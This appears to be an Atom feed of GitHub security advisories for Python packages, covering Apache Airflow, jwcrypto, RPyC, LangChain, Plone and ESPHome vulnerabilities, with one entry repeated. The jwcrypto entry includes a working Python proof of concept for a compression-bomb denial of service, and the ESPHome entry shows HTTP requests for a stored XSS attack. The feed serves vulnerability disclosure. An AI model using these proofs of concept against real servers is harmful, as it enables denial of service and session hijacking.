<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-03-07T10:01:11.828Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-ggwr-4vr8-g7wv</id>
        <link href="https://github.com/advisories/GHSA-ggwr-4vr8-g7wv"/>
        <updated>2024-03-06T23:25:04.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.6.3, is affected by a vulnerability that allows an attacker to perform unauthorized file access outside the intended directory structure by manipulating the run_id parameter. This vulnerability is considered low since it requires an authenticated user to exploit it. It is recommended to upgrade to a version that is not affected</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22887">https://nvd.nist.gov/vuln/detail/CVE-2023-22887</a></li>
<li><a href="https://github.com/apache/airflow/pull/32293">https://github.com/apache/airflow/pull/32293</a></li>
<li><a href="https://lists.apache.org/thread/rxddqs76r6rkxsg1n24d029zys67qwwo">https://lists.apache.org/thread/rxddqs76r6rkxsg1n24d029zys67qwwo</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-104.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-104.yaml</a></li>
<li><a href="https://github.com/apache/airflow/commit/05bd90f563649f2e9c8f0c85cf5838315a665a02">https://github.com/apache/airflow/commit/05bd90f563649f2e9c8f0c85cf5838315a665a02</a></li>
<li><a href="https://github.com/apache/airflow/commit/8ff7dfbd9e76aa40b04adeb231df3820606f5ba3">https://github.com/apache/airflow/commit/8ff7dfbd9e76aa40b04adeb231df3820606f5ba3</a></li>
<li><a href="https://github.com/advisories/GHSA-ggwr-4vr8-g7wv">https://github.com/advisories/GHSA-ggwr-4vr8-g7wv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggwr-4vr8-g7wv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-12T12:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow may allow authenticated users who have been deactivated to continue using the UI or API]]></title>
        <id>https://github.com/advisories/GHSA-3q8r-f3pj-3gc4</id>
        <link href="https://github.com/advisories/GHSA-3q8r-f3pj-3gc4"/>
        <updated>2024-03-06T23:04:04.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Airflow, prior to version 2.4.1, deactivating a user wouldn't prevent an already authenticated user from being able to continue using the UI or API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41672">https://nvd.nist.gov/vuln/detail/CVE-2022-41672</a></li>
<li><a href="https://github.com/apache/airflow/pull/26635">https://github.com/apache/airflow/pull/26635</a></li>
<li><a href="https://lists.apache.org/thread/ohf3pvd3dftb8zb01yngbn1jtkq5m08y">https://lists.apache.org/thread/ohf3pvd3dftb8zb01yngbn1jtkq5m08y</a></li>
<li><a href="https://github.com/apache/airflow/commit/12bfb571a895a28a58d3189b0fc10cfc1b89e24c">https://github.com/apache/airflow/commit/12bfb571a895a28a58d3189b0fc10cfc1b89e24c</a></li>
<li><a href="https://github.com/advisories/GHSA-3q8r-f3pj-3gc4">https://github.com/advisories/GHSA-3q8r-f3pj-3gc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3q8r-f3pj-3gc4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-10-07T18:16:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] OS Command Injection in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-7wqf-h36w-47mc</id>
        <link href="https://github.com/advisories/GHSA-7wqf-h36w-47mc"/>
        <updated>2024-03-06T22:53:39.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability in Apache Airflow Pinot Provider, Apache Airflow allows an attacker to control commands executed in the task execution context, without write access to DAG files. This issue affects Apache Airflow Pinot Provider versions prior to 4.0.0. It also impacts any Apache Airflow versions prior to 2.3.0 in case Apache Airflow Pinot Provider is installed (Apache Airflow Pinot Provider 4.0.0 can only be installed for Airflow 2.3.0+). Note that you need to manually install the Pinot Provider version 4.0.0 in order to get rid of the vulnerability on top of Airflow 2.3.0+ version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-38649">https://nvd.nist.gov/vuln/detail/CVE-2022-38649</a></li>
<li><a href="https://github.com/apache/airflow/pull/27641">https://github.com/apache/airflow/pull/27641</a></li>
<li><a href="https://lists.apache.org/thread/033o1gbc4ly6dpd2xf1o201v56fbl4dz">https://lists.apache.org/thread/033o1gbc4ly6dpd2xf1o201v56fbl4dz</a></li>
<li><a href="https://github.com/apache/airflow/commit/1d4fd5c6eacab0b88f8660f9d780174434393f1a">https://github.com/apache/airflow/commit/1d4fd5c6eacab0b88f8660f9d780174434393f1a</a></li>
<li><a href="https://github.com/advisories/GHSA-7wqf-h36w-47mc">https://github.com/advisories/GHSA-7wqf-h36w-47mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7wqf-h36w-47mc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-11-22T12:30:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow subject to Exposure of Sensitive Information]]></title>
        <id>https://github.com/advisories/GHSA-fvw2-2pf7-77vw</id>
        <link href="https://github.com/advisories/GHSA-fvw2-2pf7-77vw"/>
        <updated>2024-03-06T22:52:42.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in UI of Apache Airflow allows an attacker to view unmasked secrets in rendered template values for tasks which were not executed (for example when they were depending on past and previous instances of the task failed). This issue affects Apache Airflow prior to 2.3.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-27949">https://nvd.nist.gov/vuln/detail/CVE-2022-27949</a></li>
<li><a href="https://github.com/apache/airflow/pull/22754">https://github.com/apache/airflow/pull/22754</a></li>
<li><a href="https://lists.apache.org/thread/n38oc5obb48600fsvnbopxcs0jpbp65p">https://lists.apache.org/thread/n38oc5obb48600fsvnbopxcs0jpbp65p</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2022/11/14/3">http://www.openwall.com/lists/oss-security/2022/11/14/3</a></li>
<li><a href="https://github.com/apache/airflow/commit/09be0c5c7e847dda1d0be5776f8d5e327ff2281a">https://github.com/apache/airflow/commit/09be0c5c7e847dda1d0be5776f8d5e327ff2281a</a></li>
<li><a href="https://github.com/apache/airflow/commit/1cbb0ad26dd17f218c6ab1c2ae59b262c443a443">https://github.com/apache/airflow/commit/1cbb0ad26dd17f218c6ab1c2ae59b262c443a443</a></li>
<li><a href="https://github.com/advisories/GHSA-fvw2-2pf7-77vw">https://github.com/advisories/GHSA-fvw2-2pf7-77vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fvw2-2pf7-77vw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-14T12:00:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Cross site scripting in apache airflow]]></title>
        <id>https://github.com/advisories/GHSA-65xw-pcqw-hjrh</id>
        <link href="https://github.com/advisories/GHSA-65xw-pcqw-hjrh"/>
        <updated>2024-03-06T22:40:01.000Z</updated>
        <content type="html"><![CDATA[<p>It was discovered that the "Trigger DAG with config" screen was susceptible to XSS attacks via the <code>origin</code> query argument. This issue affects Apache Airflow versions 2.2.3 and below.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45229">https://nvd.nist.gov/vuln/detail/CVE-2021-45229</a></li>
<li><a href="https://lists.apache.org/thread/phx76cgtmhwwdy780rvwhobx8qoy4bnk">https://lists.apache.org/thread/phx76cgtmhwwdy780rvwhobx8qoy4bnk</a></li>
<li><a href="https://github.com/apache/airflow/commit/628aa1f99c865d97d0b1c7c76e630e43a7b8d319">https://github.com/apache/airflow/commit/628aa1f99c865d97d0b1c7c76e630e43a7b8d319</a></li>
<li><a href="https://github.com/advisories/GHSA-65xw-pcqw-hjrh">https://github.com/advisories/GHSA-65xw-pcqw-hjrh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-65xw-pcqw-hjrh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-26T00:00:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Cross-site Scripting in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-3xxv-p78r-4fc6</id>
        <link href="https://github.com/advisories/GHSA-3xxv-p78r-4fc6"/>
        <updated>2024-03-06T22:37:00.000Z</updated>
        <content type="html"><![CDATA[<p>The "origin" parameter passed to some of the endpoints like '/trigger' was vulnerable to XSS exploit. This issue affects Apache Airflow versions &lt;1.10.15 in 1.x series and affects 2.0.0 and 2.0.1 and 2.x series. This is the same as CVE-2020-13944 &amp; CVE-2020-17515 but the implemented fix did not fix the issue completely. Update to Airflow 1.10.15 or 2.0.2. Please also update your Python version to the latest available PATCH releases of the installed MINOR versions, example update to Python 3.6.13 if you are on Python 3.6. (Those contain the fix for CVE-2021-23336 <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23336">https://nvd.nist.gov/vuln/detail/CVE-2021-23336</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-28359">https://nvd.nist.gov/vuln/detail/CVE-2021-28359</a></li>
<li><a href="https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://github.com/apache/airflow/commit/2fef2ab1bf0f8c727a503940c9c65fd5be208386">https://github.com/apache/airflow/commit/2fef2ab1bf0f8c727a503940c9c65fd5be208386</a></li>
<li><a href="https://github.com/advisories/GHSA-3xxv-p78r-4fc6">https://github.com/advisories/GHSA-3xxv-p78r-4fc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xxv-p78r-4fc6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-06-18T18:43:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Cross-site Scripting in Apache Airflow]]></title>
        <id>https://github.com/advisories/GHSA-3xxv-p78r-4fc6</id>
        <link href="https://github.com/advisories/GHSA-3xxv-p78r-4fc6"/>
        <updated>2024-03-06T22:37:00.000Z</updated>
        <content type="html"><![CDATA[<p>The "origin" parameter passed to some of the endpoints like '/trigger' was vulnerable to XSS exploit. This issue affects Apache Airflow versions &lt;1.10.15 in 1.x series and affects 2.0.0 and 2.0.1 and 2.x series. This is the same as CVE-2020-13944 &amp; CVE-2020-17515 but the implemented fix did not fix the issue completely. Update to Airflow 1.10.15 or 2.0.2. Please also update your Python version to the latest available PATCH releases of the installed MINOR versions, example update to Python 3.6.13 if you are on Python 3.6. (Those contain the fix for CVE-2021-23336 <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23336">https://nvd.nist.gov/vuln/detail/CVE-2021-23336</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-28359">https://nvd.nist.gov/vuln/detail/CVE-2021-28359</a></li>
<li><a href="https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E">https://lists.apache.org/thread.html/ra8ce70088ba291f358e077cafdb14d174b7a1ce9a9d86d1b332d6367%40%3Cusers.airflow.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E">https://lists.apache.org/thread.html/rc005f4de9d9b0ba943ceb8ff5a21a5c6ff8a9df52632476698d99432@%3Cannounce.apache.org%3E</a></li>
<li><a href="https://github.com/apache/airflow/commit/2fef2ab1bf0f8c727a503940c9c65fd5be208386">https://github.com/apache/airflow/commit/2fef2ab1bf0f8c727a503940c9c65fd5be208386</a></li>
<li><a href="https://github.com/advisories/GHSA-3xxv-p78r-4fc6">https://github.com/advisories/GHSA-3xxv-p78r-4fc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xxv-p78r-4fc6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-06-18T18:43:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Improper Input Validation in Apache Airflow resulting in Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-8fg4-j562-mjrc</id>
        <link href="https://github.com/advisories/GHSA-8fg4-j562-mjrc"/>
        <updated>2024-03-06T22:13:39.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Airflow 1.8.2 and earlier, an authenticated user can execute code remotely on the Airflow webserver by creating a special object.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15720">https://nvd.nist.gov/vuln/detail/CVE-2017-15720</a></li>
<li><a href="https://github.com/advisories/GHSA-8fg4-j562-mjrc">https://github.com/advisories/GHSA-8fg4-j562-mjrc</a></li>
<li><a href="https://lists.apache.org/thread.html/ade4d54ebf614f68dc81a08891755e60ea58ba88e0209233eeea5f57@%3Cdev.airflow.apache.org%3E">https://lists.apache.org/thread.html/ade4d54ebf614f68dc81a08891755e60ea58ba88e0209233eeea5f57@%3Cdev.airflow.apache.org%3E</a></li>
<li><a href="https://github.com/apache/airflow/commit/04cacdd0a7526927137b452f38c3e894a5d2ce4a">https://github.com/apache/airflow/commit/04cacdd0a7526927137b452f38c3e894a5d2ce4a</a></li>
<li><a href="https://github.com/apache/airflow/commit/daa281c0364609d6812921123cf47e4118b40484">https://github.com/apache/airflow/commit/daa281c0364609d6812921123cf47e4118b40484</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8fg4-j562-mjrc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-01-25T16:19:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jwcrypto] JWCrypto vulnerable to JWT bomb Attack in `deserialize` function]]></title>
        <id>https://github.com/advisories/GHSA-j857-7rvv-vj97</id>
        <link href="https://github.com/advisories/GHSA-j857-7rvv-vj97"/>
        <updated>2024-03-06T20:00:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="affected-version">Affected version</h2>
<p>Vendor: <a href="https://github.com/latchset/jwcrypto">https://github.com/latchset/jwcrypto</a>
Version: 1.5.5</p>
<h2 id="description">Description</h2>
<p>An attacker can cause a DoS attack by passing in a malicious JWE Token with a high compression ratio.
When the server processes this Token, it will consume a lot of memory and processing time.</p>
<h2 id="poc">Poc</h2>
<pre><code class="language-python">from jwcrypto import jwk, jwe
from jwcrypto.common import json_encode, json_decode
import time
public_key = jwk.JWK()
private_key = jwk.JWK.generate(kty='RSA', size=2048)
public_key.import_key(**json_decode(private_key.export_public()))


payload = '{"u": "' + "u" * 400000000 + '", "uu":"' + "u" * 400000000 + '"}'
protected_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256CBC-HS512",
    "typ": "JWE",
    "zip": "DEF",
    "kid": public_key.thumbprint(),
}
jwetoken = jwe.JWE(payload.encode('utf-8'),
                   recipient=public_key,
                   protected=protected_header)
enc = jwetoken.serialize(compact=True)

print("-----uncompress-----")

print(len(enc))

begin = time.time()

jwetoken = jwe.JWE()
jwetoken.deserialize(enc, key=private_key)

print(time.time() - begin)

print("-----compress-----")

payload = '{"u": "' + "u" * 400000 + '", "uu":"' + "u" * 400000 + '"}'
protected_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256CBC-HS512",
    "typ": "JWE",
    "kid": public_key.thumbprint(),
}
jwetoken = jwe.JWE(payload.encode('utf-8'),
                   recipient=public_key,
                   protected=protected_header)
enc = jwetoken.serialize(compact=True)

print(len(enc))

begin = time.time()

jwetoken = jwe.JWE()
jwetoken.deserialize(enc, key=private_key)

print(time.time() - begin)
</code></pre>
<p>It can be found that when processing Tokens with similar lengths, the processing time of compressed tokens is significantly longer.
<img src="https://github.com/latchset/jwcrypto/assets/133195620/23193327-3cd7-499a-b5aa-28c56af92785" alt="image" width="172"></p>
<h2 id="mitigation">Mitigation</h2>
<p>To mitigate this vulnerability, it is recommended to limit the maximum token length to 250K. This approach has also
been adopted by the JWT library System.IdentityModel.Tokens.Jwt used in Microsoft Azure [1], effectively preventing
attackers from exploiting this vulnerability with high compression ratio tokens.</p>
<h2 id="references">References</h2>
<p>[1] <a href="https://github.com/AzureAD/azure-activedirectory-identitymodel-extensions-for-dotnet/security/advisories/GHSA-8g9c-28fc-mcx2">CVE-2024-21319</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/latchset/jwcrypto/security/advisories/GHSA-j857-7rvv-vj97">https://github.com/latchset/jwcrypto/security/advisories/GHSA-j857-7rvv-vj97</a></li>
<li><a href="https://github.com/latchset/jwcrypto/commit/90477a3b6e73da69740e00b8161f53fea19b831f">https://github.com/latchset/jwcrypto/commit/90477a3b6e73da69740e00b8161f53fea19b831f</a></li>
<li><a href="https://github.com/advisories/GHSA-j857-7rvv-vj97">https://github.com/advisories/GHSA-j857-7rvv-vj97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j857-7rvv-vj97</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T20:00:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rpyc] RPyC's missing security check results in code execution when using numpy.array on the server-side.]]></title>
        <id>https://github.com/advisories/GHSA-h5cg-53g7-gqjw</id>
        <link href="https://github.com/advisories/GHSA-h5cg-53g7-gqjw"/>
        <updated>2024-03-06T17:05:32.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in Open Source: RPyC v.4.00 thru v.5.3.1 allows a remote attacker to execute arbitrary code via a crafted script to the <code>__array__</code> attribute component. This vulnerability was introduced in <a href="https://github.com/tomerfiliba-org/rpyc/commit/9f45f8269d4106905db61d82cd529cacdb178911">9f45f826</a>.</p>
<h3 id="attack-vector">Attack Vector</h3>
<p>RPyC services that rely on the <code>__array__</code> attribute used by numpy are impacted. When the server-side exposes a method that calls the attribute named <code>__array__</code> for a a client provided netref (e.g., <code>np.array(client_netref)</code>), a remote attacker can craft a class which results in remote code execution</p>
<h3 id="impact">Impact</h3>
<p>Assuming the system exposes a method that calls the attribute <code>__array__</code>, an attacker can execute code using the vulnerable component. </p>
<h3 id="patches">Patches</h3>
<p>The fix is available in RPyC 6.0.0. The major version change is because some users may need to set <code>allow_pickle</code> to <code>True</code> when migrating to RPyC 6.</p>
<h3 id="workarounds">Workarounds</h3>
<p>While the recommend fix is to upgrade to RPyC 6.0.0, the workaround is to <a href="https://github.com/tomerfiliba-org/rpyc/commit/bba1d3562e6f9f1256ec64048cc23001c0bb7516">apply bba1d356 as patch.</a></p>
<h3 id="affected-component">Affected Component</h3>
<p><a href="https://github.com/tomerfiliba-org/rpyc/blob/5.3.1/rpyc/core/netref.py#L252-L255">The affected component</a> is the <code>__array__</code> method constructed for <code>NetrefClass</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://gist.github.com/renbou/957f70d27470982994f12a1d70153d09">Original disclosure</a> by <a href="https://gist.github.com/renbou">renbou (Artem Mikheev)</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27758">CVE-2024-27758</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tomerfiliba-org/rpyc/security/advisories/GHSA-h5cg-53g7-gqjw">https://github.com/tomerfiliba-org/rpyc/security/advisories/GHSA-h5cg-53g7-gqjw</a></li>
<li><a href="https://github.com/tomerfiliba-org/rpyc/commit/9f45f8269d4106905db61d82cd529cacdb178911">https://github.com/tomerfiliba-org/rpyc/commit/9f45f8269d4106905db61d82cd529cacdb178911</a></li>
<li><a href="https://github.com/tomerfiliba-org/rpyc/commit/bba1d3562e6f9f1256ec64048cc23001c0bb7516">https://github.com/tomerfiliba-org/rpyc/commit/bba1d3562e6f9f1256ec64048cc23001c0bb7516</a></li>
<li><a href="https://gist.github.com/renbou/957f70d27470982994f12a1d70153d09">https://gist.github.com/renbou/957f70d27470982994f12a1d70153d09</a></li>
<li><a href="https://github.com/tomerfiliba-org/rpyc/blob/5.3.1/rpyc/core/netref.py#L252-L255">https://github.com/tomerfiliba-org/rpyc/blob/5.3.1/rpyc/core/netref.py#L252-L255</a></li>
<li><a href="https://github.com/advisories/GHSA-h5cg-53g7-gqjw">https://github.com/advisories/GHSA-h5cg-53g7-gqjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h5cg-53g7-gqjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-06T17:05:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] LangChain directory traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h59x-p739-982c</id>
        <link href="https://github.com/advisories/GHSA-h59x-p739-982c"/>
        <updated>2024-03-06T16:13:39.000Z</updated>
        <content type="html"><![CDATA[<p>LangChain through 0.1.10 allows ../ directory traversal by an actor who is able to control the final part of the path parameter in a load_chain call. This bypasses the intended behavior of loading configurations only from the hwchase17/langchain-hub GitHub repository. The outcome can be disclosure of an API key for a large language model online service, or remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28088">https://nvd.nist.gov/vuln/detail/CVE-2024-28088</a></li>
<li><a href="https://github.com/PinkDraconian/PoC-Langchain-RCE/blob/main/README.md">https://github.com/PinkDraconian/PoC-Langchain-RCE/blob/main/README.md</a></li>
<li><a href="https://github.com/langchain-ai/langchain/blob/f96dd57501131840b713ed7c2e86cbf1ddc2761f/libs/core/langchain_core/utils/loading.py">https://github.com/langchain-ai/langchain/blob/f96dd57501131840b713ed7c2e86cbf1ddc2761f/libs/core/langchain_core/utils/loading.py</a></li>
<li><a href="https://github.com/langchain-ai/langchain/commit/e1924b3e93d513ca950c72f8e80e1c133749fba5">https://github.com/langchain-ai/langchain/commit/e1924b3e93d513ca950c72f8e80e1c133749fba5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-43.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2024-43.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h59x-p739-982c">https://github.com/advisories/GHSA-h59x-p739-982c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h59x-p739-982c</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-04T00:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Plone] Phone information disclosure vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-xg5p-8wg5-rhxm</id>
        <link href="https://github.com/advisories/GHSA-xg5p-8wg5-rhxm"/>
        <updated>2024-03-06T15:31:16.000Z</updated>
        <content type="html"><![CDATA[<p>Due to incorrect access control in Plone version v6.0.9, remote attackers can view and list all files hosted on the website via sending a crafted request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22889">https://nvd.nist.gov/vuln/detail/CVE-2024-22889</a></li>
<li><a href="https://github.com/shenhav12/CVE-2024-22889-Plone-v6.0.9">https://github.com/shenhav12/CVE-2024-22889-Plone-v6.0.9</a></li>
<li><a href="https://github.com/advisories/GHSA-xg5p-8wg5-rhxm">https://github.com/advisories/GHSA-xg5p-8wg5-rhxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xg5p-8wg5-rhxm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T00:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[esphome] esphome vulnerable to stored Cross-site Scripting in edit configuration file API]]></title>
        <id>https://github.com/advisories/GHSA-9p43-hj5j-96h5</id>
        <link href="https://github.com/advisories/GHSA-9p43-hj5j-96h5"/>
        <updated>2024-03-06T15:28:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Edit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation and Home Assistant add-on) serves unsanitized data with “Content-Type: text/html; charset=UTF-8”, allowing remote authenticated user to inject arbitrary web script and exfiltrate session cookies via Cross-Site scripting (XSS).</p>
<h3 id="credits">Credits</h3>
<p>Spike Reply Cybersecurity Teams</p>
<h3 id="details">Details</h3>
<p>It is possible for a malicious authenticated user to inject arbitrary Javascript in configuration files using a POST request to the /edit endpoint, the configuration parameter allows to specify the file to write. </p>
<p>To trigger the XSS vulnerability, the victim must visit the page /edit?configuration=[xss file].</p>
<h3 id="poc">PoC</h3>
<p>To reproduce the issue, it is possible to perform a POST request to inject the payload:</p>
<p>request:
POST /edit?configuration=xss.yaml HTTP/1.1
Host: localhost:6052
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: <em>/</em>
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: <a href="http://localhost:6052/">http://localhost:6052/</a>
Connection: close
Cookie: authenticated=[replace with valid cookie]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 40</p>


<hr>
<p>response:
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Nov 2023 11:02:27 GMT
Content-Length: 0
Connection: close</p>
<p>And subsequently trigger the XSS with a GET request to the same endpoint:</p>
<p>request:
GET /edit?configuration=xss.yaml HTTP/1.1
Host: localhost:6052
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: <em>/</em>
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: <a href="http://localhost:6052/">http://localhost:6052/</a>
Connection: close
Cookie: authenticated=2|1:0|10:1701341719|13:authenticated|4:eWVz|0907127d7274094cc5a2490b95becf5c11fd52b8c3ee3655d65fe9fda099108c
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0</p>
<hr>
<p>response:
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Nov 2023 11:04:12 GMT
Etag: "ec6c9889f5c9a6c8e9d2d5e4ce1b1a85e6e7da2b"
Content-Length: 40
Connection: close</p>



<h3 id="impact">Impact</h3>
<p>Abusing this vulnerability a malicious actor could perform operations on the dashboard on the behalf of a logged user, access sensitive information, create, edit and delete configuration files and flash firmware on managed boards.
In addition to this, cookies are not correctly secured, allowing the exfiltration of session cookie values.</p>
<h3 id="credits-1">Credits</h3>
<p>Spike Reply Cybersecurity Team</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/esphome/esphome/security/advisories/GHSA-9p43-hj5j-96h5">https://github.com/esphome/esphome/security/advisories/GHSA-9p43-hj5j-96h5</a></li>
<li><a href="https://github.com/esphome/esphome/commit/37d2b3c7977a4ccbec59726ca7549cb776661455">https://github.com/esphome/esphome/commit/37d2b3c7977a4ccbec59726ca7549cb776661455</a></li>
<li><a href="https://github.com/advisories/GHSA-9p43-hj5j-96h5">https://github.com/advisories/GHSA-9p43-hj5j-96h5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
